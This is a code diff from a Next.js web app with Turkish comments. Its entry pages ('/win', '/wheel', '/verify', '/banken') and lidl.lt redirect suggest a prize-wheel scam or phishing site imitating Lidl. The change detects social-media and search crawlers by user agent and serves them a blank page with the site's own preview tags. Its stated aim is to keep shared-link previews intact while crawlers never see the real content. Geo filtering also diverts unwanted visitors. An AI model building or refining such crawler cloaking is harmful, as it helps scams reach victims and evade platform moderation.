@@ -5,7 +5,7 @@ import { createSessionAction } from "@/app/actions/create-session";
 import { buildShareMetadata } from "@/lib/share-metadata";
 import { createServerSupabaseClient } from "@/lib/supabase/server";
 import { pathToStep, stepToPath } from "@/lib/session-routes";
-import { getBlockedRedirectUrl, getGeoRedirectTarget } from "@/lib/geo-guard";
+import { getBlockedRedirectUrl } from "@/lib/geo-guard";
 import { ACTIVE_SESSION_COOKIE } from "@/lib/session-constants";
 
 const ALLOWED_ENTRY_PAGES = ["/win", "/verify", "/wheel", "/code", "/banken"];
@@ -219,9 +219,10 @@ const BOT_UA =
   /facebookexternalhit|facebot|twitterbot|whatsapp|telegrambot|linkedinbot|discordbot|slackbot|pinterest|redditbot|skypeuripreview|viber|vkshare|applebot|googlebot|bingbot|duckduckbot|baiduspider|yandex/i;
 
 export default async function Home({ searchParams }: Props) {
-  // Bot/crawler istekleri siteye girmesin: dogrudan engellenen ulke
-  // yonlendirme hedefine (genel ayarlardaki URL, varsayilan lidl.lt) gonder.
-  // NOT: redirect() try/catch disinda cagirilmali (NEXT_REDIRECT yutulmasin).
+  // Bot/crawler istekleri siteye girmesin: gercek icerik yerine sadece
+  // head meta'li bos sayfa dondur (generateMetadata og:* tag'lerini basar).
+  // Boylece FB/WA/TG onizlemesi kendi og:image'imizi gorur — lidl.lt'ye
+  // 307 atarsak crawler o sitenin og etiketlerini alir, onizleme bozulur.
   let isBot = false;
   try {
     const h = await headers();
@@ -230,7 +231,7 @@ export default async function Home({ searchParams }: Props) {
     // headers() erisilemezse normal akis
   }
   if (isBot) {
-    redirect(await getGeoRedirectTarget());
+    return <div />;
   }
 
   // Geo filtre: secili olmayan ulkeden gelen ziyaretci yonlendirme URL'sine gider.
